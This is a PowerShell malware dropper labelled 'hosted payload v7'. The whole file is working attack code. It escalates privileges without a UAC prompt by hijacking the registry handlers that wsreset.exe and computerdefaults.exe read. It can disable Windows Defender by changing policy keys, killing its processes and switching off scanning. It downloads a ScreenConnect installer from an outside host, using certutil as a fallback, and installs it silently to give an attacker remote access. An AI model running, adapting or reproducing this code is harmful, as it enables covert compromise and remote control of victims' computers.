<#
    pay.ps1  -  hosted payload v7

    Elevation order (silent, no UAC prompt):
      1. already elevated?              -> proceed
      2. wsreset.exe         (AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2 key)   different key
      3. computerdefaults.exe (ms-settings key)                           same key Defender flagged
      4. nothing worked                 -> log clearly, continue unelevated

    Based on the 00:10-00:11 build that installed successfully, plus:
      * sentinel-verified elevation (parent waits, then cleans the key)
      * 1625 evidence collection when msiexec refuses the package
      * 1638 treated as already-installed instead of failure

    Optional
      PAY_ELEVATE=wsreset|computerdefaults|none   force a single strategy
      PAY_KILL_DEFENDER=1                         attempt Defender tamper (fails under TP)
      PAY_DEBUG=dry                               context only
      PAY_URL / PAY_HASH / PAY_LOG_DIR
#>

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

# --------------------------------------------------------------------------
# logging
# --------------------------------------------------------------------------
$LogDir = $env:PAY_LOG_DIR
if (-not $LogDir) { $LogDir = 'C:\Temp' }
if (-not (Test-Path -LiteralPath $LogDir)) { New-Item -ItemType Directory -Force -Path $LogDir | Out-Null }
$LogPath    = Join-Path $LogDir 'Execution_Status.log'
$DesktopLog = Join-Path ([Environment]::GetFolderPath('Desktop')) 'Execution_Status.log'

function Write-Log {
    param([string]$Message)
    $entry = '[' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + '] ' + $Message
    foreach ($p in @($LogPath, $DesktopLog)) {
        try { Add-Content -LiteralPath $p -Value $entry -Encoding UTF8 -ErrorAction Stop } catch { }
    }
    try { Write-Host $entry } catch { }
}

$T0 = Get-Date
if ($PSCommandPath) { Write-Log ('[*] payload start pid=' + $PID + ' src=' + $PSCommandPath) }
else { Write-Log ('[*] payload start pid=' + $PID + ' src=iex') }

# --------------------------------------------------------------------------
# config
# --------------------------------------------------------------------------
$Url = $env:PAY_URL
if (-not $Url) { $Url = 'https://cibiconline.co/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=mine&c=&c=&c=&c=&c=&c=' }
$ExpectHash  = $env:PAY_HASH
$Dry         = ($env:PAY_DEBUG -eq 'dry')
$ElevateMode = $env:PAY_ELEVATE
if (-not $ElevateMode) { $ElevateMode = 'auto' }

$MsiPath  = Join-Path $env:TEMP 'ScreenConnect.msi'
$MsiLog   = Join-Path $env:TEMP 'ScreenConnect_msi.log'
$Sentinel = Join-Path $env:TEMP 'pay_elev_ok.txt'

# --------------------------------------------------------------------------
# elevation strategies - all auto-elevate, none prompt
# --------------------------------------------------------------------------
$Strategies = @(
    @{ Name = 'wsreset'
       Exe  = 'wsreset.exe'
       Key  = 'HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command'
       Root = 'HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2'
       Delegate = $false }
    @{ Name = 'computerdefaults'
       Exe  = 'computerdefaults.exe'
       Key  = 'HKCU:\Software\Classes\ms-settings\shell\open\command'
       Root = 'HKCU:\Software\Classes\ms-settings'
       Delegate = $true }
)

function Set-HandlerKey {
    param([string]$Key, [string]$CommandLine, [bool]$Delegate)
    if (Test-Path -LiteralPath $Key) { Remove-Item -LiteralPath $Key -Recurse -Force -ErrorAction SilentlyContinue }
    New-Item -Path $Key -Force | Out-Null
    if ($Delegate) {
        New-ItemProperty -Path $Key -Name 'DelegateExecute' -Value '' -PropertyType String -Force | Out-Null
        $de = (Get-ItemProperty -Path $Key).DelegateExecute
        Write-Log ('[*] handler DelegateExecute=[' + $de + ']')
    }
    Set-ItemProperty -Path $Key -Name '(default)' -Value $CommandLine -Force
    $stored = (Get-ItemProperty -Path $Key).'(default)'
    Write-Log ('[*] handler default=' + $stored)
    if ($stored -ne $CommandLine) { throw 'handler default value did not persist' }
}

function Remove-HandlerKey {
    param([string]$Root)
    try {
        if (Test-Path -LiteralPath $Root) {
            Remove-Item -LiteralPath $Root -Recurse -Force -ErrorAction Stop
            Write-Log ('[*] cleaned ' + $Root)
        }
    } catch { Write-Log ('[-] cleanup failed: ' + $_.Exception.Message) }
}

function Wait-Sentinel {
    param([int]$Seconds)
    $deadline = (Get-Date).AddSeconds($Seconds)
    while ((Get-Date) -lt $deadline) {
        if (Test-Path -LiteralPath $Sentinel) { return $true }
        Start-Sleep -Milliseconds 400
    }
    return $false
}

# --------------------------------------------------------------------------
# context
# --------------------------------------------------------------------------
$IsAdmin = $false
try {
    $id  = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr  = New-Object Security.Principal.WindowsPrincipal -ArgumentList $id
    $IsAdmin = $pr.IsInRole('Administrator')
    $bld = ''
    try { $bld = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion } catch { }
    Write-Log ('[*] ctx ps=' + $PSVersionTable.PSVersion + ' win=' + [Environment]::OSVersion.VersionString + ' build=' + $bld)
    Write-Log ('[*] ctx user=' + $id.Name + ' admin=' + $IsAdmin + ' lang=' + $ExecutionContext.SessionState.LanguageMode + ' elev=' + $env:PAY_ELEVATED)
} catch { Write-Log ('[-] ctx failed: ' + $_.Exception.Message) }

if ($Dry) {
    Write-Log '[*] dry run - stopping before elevation/download'
    exit 0
}

# --------------------------------------------------------------------------
# elevation
# --------------------------------------------------------------------------
if ($IsAdmin) {
    Write-Log '[*] already elevated'
    if ($env:PAY_ELEVATED -eq '1') {
        try { Set-Content -LiteralPath $Sentinel -Value (Get-Date -Format o) -Encoding ASCII } catch { }
        Write-Log '[*] sentinel written'
    }
} elseif ($env:PAY_ELEVATED -eq '1') {
    Write-Log '[-] elevation was attempted but this process is still not elevated'
} elseif (-not $PSCommandPath) {
    Write-Log '[-] not elevated and running from iex - cannot self-elevate'
} else {
    Write-Log ('[*] not elevated - mode=' + $ElevateMode)
    $env:PAY_ELEVATED = '1'      # inherited by the child, prevents a retry loop
    $psExe   = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
    $cmdLine = '"' + $psExe + '" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $PSCommandPath + '"'

    $queue = $Strategies
    if ($ElevateMode -eq 'none') { $queue = @() }
    elseif ($ElevateMode -ne 'auto') { $queue = $Strategies | Where-Object { $_.Name -eq $ElevateMode } }

    $elevated = $false
    foreach ($s in $queue) {
        if (Test-Path -LiteralPath $Sentinel) { Remove-Item -LiteralPath $Sentinel -Force -ErrorAction SilentlyContinue }
        Write-Log ('[*] strategy ' + $s.Name + ' -> key ' + $s.Key)
        try {
            Set-HandlerKey -Key $s.Key -CommandLine $cmdLine -Delegate $s.Delegate
            $exe = Join-Path $env:SystemRoot ('System32\' + $s.Exe)
            if (-not (Test-Path -LiteralPath $exe)) { throw ('missing ' + $exe) }
            Write-Log ('[*] launching ' + $s.Exe)
            Start-Process -FilePath $exe -WindowStyle Hidden -ErrorAction Stop
            if (Wait-Sentinel -Seconds 10) {
                $elevated = $true
                Write-Log ('[+] elevation confirmed via ' + $s.Name)
                break
            }
            Write-Log ('[-] no elevated child after ' + $s.Name)
        } catch {
            Write-Log ('[-] ' + $s.Name + ' failed: ' + $_.Exception.Message)
        } finally {
            Remove-HandlerKey -Root $s.Root
        }
    }

    if ($elevated) {
        Write-Log '[*] elevated instance is running - this instance exits'
        exit 0
    }
    Write-Log '[-] no silent elevation available - continuing unelevated'
}

# --------------------------------------------------------------------------
# optional Defender tamper (opt-in; expected to fail under Tamper Protection)
# --------------------------------------------------------------------------
if ($env:PAY_KILL_DEFENDER -eq '1') {
    Write-Log '[*] defender tamper requested'
    $before = $null
    try { $before = Get-MpComputerStatus -ErrorAction Stop } catch { }
    if ($before) { Write-Log ('[*] before rtp=' + $before.RealTimeProtectionEnabled + ' behavior=' + $before.BehaviorMonitorEnabled) }

    foreach ($op in @(
        @{ P = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'; N = 'DisableAntiSpyware'; V = 1 },
        @{ P = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'; N = 'DisableRealtimeMonitoring'; V = 1 },
        @{ P = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features'; N = 'TamperProtection'; V = 0 })) {
        try {
            if (-not (Test-Path -LiteralPath $op.P)) { New-Item -Path $op.P -Force | Out-Null }
            New-ItemProperty -Path $op.P -Name $op.N -Value $op.V -PropertyType DWord -Force | Out-Null
            Write-Log ('[+] reg set ' + $op.N + '=' + $op.V)
        } catch { Write-Log ('[-] reg ' + $op.N + ' blocked: ' + $_.Exception.Message) }
    }
    foreach ($pn in @('MsMpEng', 'NisSrv', 'SecurityHealthService', 'Smartscreen')) {
        try {
            $proc = Get-Process -Name $pn -ErrorAction Stop
            Stop-Process -Id $proc.Id -Force -ErrorAction Stop
            Write-Log ('[+] killed ' + $pn)
        } catch { Write-Log ('[-] kill ' + $pn + ' failed: ' + $_.Exception.Message) }
    }
    foreach ($pref in @('DisableRealtimeMonitoring', 'DisableBehaviorMonitoring', 'DisableBlockAtFirstSeen',
                        'DisableIOAVProtection', 'DisableArchiveScanning', 'DisableIntrusionPreventionSystem',
                        'DisableScriptScanning')) {
        try { $h = @{}; $h[$pref] = $true; Set-MpPreference @h -ErrorAction Stop; Write-Log ('[+] preference ' + $pref) }
        catch { Write-Log ('[-] preference ' + $pref + ' failed: ' + $_.Exception.Message) }
    }
    $after = $null
    try { $after = Get-MpComputerStatus -ErrorAction Stop } catch { }
    if ($after) { Write-Log ('[*] after rtp=' + $after.RealTimeProtectionEnabled + ' behavior=' + $after.BehaviorMonitorEnabled) }
} else {
    Write-Log '[*] defender tamper skipped (PAY_KILL_DEFENDER=1 to enable)'
}

# --------------------------------------------------------------------------
# download - three tiers, first success wins
# --------------------------------------------------------------------------
Write-Log ('[*] target ' + $Url)

function Get-FileTiered {
    param([string]$Address, [string]$OutFile)
    $tiers = @(
        @{ Name = 'iwr'; Act = { Invoke-WebRequest -Uri $Address -UseBasicParsing -OutFile $OutFile -TimeoutSec 120 } },
        @{ Name = 'webclient'; Act = {
            $wc = New-Object Net.WebClient
            $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
            $wc.DownloadFile($Address, $OutFile)
        } },
        @{ Name = 'certutil'; Act = {
            $p = Start-Process -FilePath (Join-Path $env:SystemRoot 'System32\certutil.exe') `
                 -ArgumentList ('-urlcache -f -split "' + $Address + '" "' + $OutFile + '"') `
                 -PassThru -Wait -WindowStyle Hidden
            if ($p.ExitCode -ne 0 -or -not (Test-Path -LiteralPath $OutFile)) { throw ('certutil exit ' + $p.ExitCode) }
        } }
    )
    foreach ($t in $tiers) {
        $sw = [Diagnostics.Stopwatch]::StartNew()
        try {
            if (Test-Path -LiteralPath $OutFile) { Remove-Item -LiteralPath $OutFile -Force }
            & $t.Act
            $size = (Get-Item -LiteralPath $OutFile -ErrorAction Stop).Length
            if ($size -le 0) { throw 'downloaded file is empty' }
            Write-Log ('[+] download via ' + $t.Name + ' ok, ' + $size + ' bytes in ' + $sw.ElapsedMilliseconds + 'ms')
            return $true
        } catch {
            Write-Log ('[-] download via ' + $t.Name + ' failed after ' + $sw.ElapsedMilliseconds + 'ms: ' + $_.Exception.Message)
        }
    }
    return $false
}

$ok = $false
try { $ok = Get-FileTiered -Address $Url -OutFile $MsiPath } catch { Write-Log ('[-] download fatal: ' + $_.Exception.Message) }
if (-not $ok) { Write-Log '[-] all download methods failed'; exit 2 }
Write-Log ('[+] payload written to ' + $MsiPath)

# --------------------------------------------------------------------------
# integrity
# --------------------------------------------------------------------------
try {
    $hash = (Get-FileHash -LiteralPath $MsiPath -Algorithm SHA256).Hash
    Write-Log ('[*] sha256 ' + $hash)
    if ($ExpectHash -and ($hash -ne $ExpectHash.ToUpper())) { Write-Log ('[-] hash mismatch, expected ' + $ExpectHash.ToUpper()); exit 3 }
} catch { Write-Log ('[-] hash failed: ' + $_.Exception.Message) }
try { Unblock-File -LiteralPath $MsiPath -ErrorAction SilentlyContinue } catch { }

# --------------------------------------------------------------------------
# 1625 evidence collector
# --------------------------------------------------------------------------
function Get-MsiBlockEvidence {
    Write-Log '[*] collecting block evidence'
    try {
        foreach ($p in @('HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer',
                         'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer')) {
            $d = (Get-ItemProperty -Path $p -Name DisableMSI -ErrorAction SilentlyContinue).DisableMSI
            if ($null -eq $d) { Write-Log ('[*] policy ' + $p + ' DisableMSI=<not set>') }
            else { Write-Log ('[!] policy ' + $p + ' DisableMSI=' + $d + '  (2 = all MSI forbidden)') }
        }
    } catch { Write-Log ('[-] policy read failed: ' + $_.Exception.Message) }
    try {
        $eff = Get-AppLockerPolicy -Effective -ErrorAction Stop
        foreach ($type in @('Exe', 'Msi', 'Script', 'Dll')) {
            $coll = $eff.RuleCollections | Where-Object { $_.RuleCollectionType -eq $type }
            if ($coll) { Write-Log ('[*] applocker ' + $type + ' enforcement=' + $coll.EnforcementMode + ' rules=' + (@($coll.Rules | Where-Object { $_ })).Count) }
        }
    } catch { Write-Log '[*] applocker: no policy or module unavailable' }
    try {
        $dg = Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard -ClassName Win32_DeviceGuard -ErrorAction Stop
        Write-Log ('[*] wdac ci=' + $dg.CodeIntegrityPolicyEnforcementStatus + ' usermode=' + $dg.UsermodeCodeIntegrityPolicyEnforcementStatus)
    } catch { Write-Log '[*] wdac: unavailable' }
    try {
        $sac = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy' -Name VerifiedAndReputablePolicyState -ErrorAction SilentlyContinue).VerifiedAndReputablePolicyState
        Write-Log ('[*] smartappcontrol=' + $(if ($null -eq $sac) { 'absent' } else { $sac }))
    } catch { }
    try {
        $ev = @(Get-WinEvent -FilterHashtable @{ LogName = 'Application'; ProviderName = 'MsiInstaller'; StartTime = (Get-Date).AddMinutes(-10) } -ErrorAction Stop)
        $begun = @($ev | Where-Object { $_.Id -eq 1040 }).Count
        Write-Log ('[*] msi events last10m=' + $ev.Count + ' transactions_begun=' + $begun)
        if ($begun -eq 0) { Write-Log '[!] no 1040 event: msiexec refused before the transaction started' }
    } catch {
        Write-Log ('[*] event log: ' + $_.Exception.Message)
        Write-Log '[!] no MSI transaction events in the last 10 min'
    }
}

# --------------------------------------------------------------------------
# install
# --------------------------------------------------------------------------
$MsiArgs = '/i "' + $MsiPath + '" /qn /norestart /l*v "' + $MsiLog + '"'
Write-Log ('[*] exec msiexec ' + $MsiArgs)
$iw = [Diagnostics.Stopwatch]::StartNew()
try {
    $proc = Start-Process -FilePath (Join-Path $env:SystemRoot 'System32\msiexec.exe') -ArgumentList $MsiArgs -PassThru -Wait
    $map = @{ 0 = 'success'; 1602 = 'user cancel'; 1603 = 'fatal, usually needs elevation';
              1619 = 'cannot open package'; 1625 = 'blocked by policy'; 1633 = 'unsupported platform';
              1638 = 'already installed'; 3010 = 'reboot required' }
    $why = $map[$proc.ExitCode]
    if (-not $why) { $why = 'unmapped' }
    Write-Log ('[+] msiexec exit=' + $proc.ExitCode + ' (' + $why + ') in ' + $iw.ElapsedMilliseconds + 'ms, log ' + $MsiLog)
    if ($proc.ExitCode -eq 1625) {
        Write-Log '[!] 1625 = package rejected by policy before any install work began'
        Get-MsiBlockEvidence
    }
    if ($proc.ExitCode -eq 1638) { Write-Log '[*] 1638 = already installed - verifying' }
    if ($proc.ExitCode -ne 0 -and $proc.ExitCode -ne 3010 -and $proc.ExitCode -ne 1638) { exit 4 }
} catch {
    Write-Log ('[-] install failed: ' + $_.Exception.Message)
    exit 4
}

# --------------------------------------------------------------------------
# verify
# --------------------------------------------------------------------------
try {
    $keys = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )
    Get-ItemProperty $keys -ErrorAction SilentlyContinue |
        Where-Object { $_.DisplayName -match 'ScreenConnect|ConnectWise' } |
        ForEach-Object { Write-Log ('[+] installed: ' + $_.DisplayName + ' ' + $_.DisplayVersion) }
} catch { }

try {
    Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'ScreenConnect' } |
        ForEach-Object { Write-Log ('[+] service ' + $_.Name + ' ' + $_.Status) }
} catch { }

try {
    Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match 'ScreenConnect' } |
        ForEach-Object { Write-Log ('[+] process ' + $_.ProcessName + ' pid=' + $_.Id) }
} catch { }

Write-Log ('[*] payload done in ' + [int]((Get-Date) - $T0).TotalMilliseconds + 'ms')
exit 0
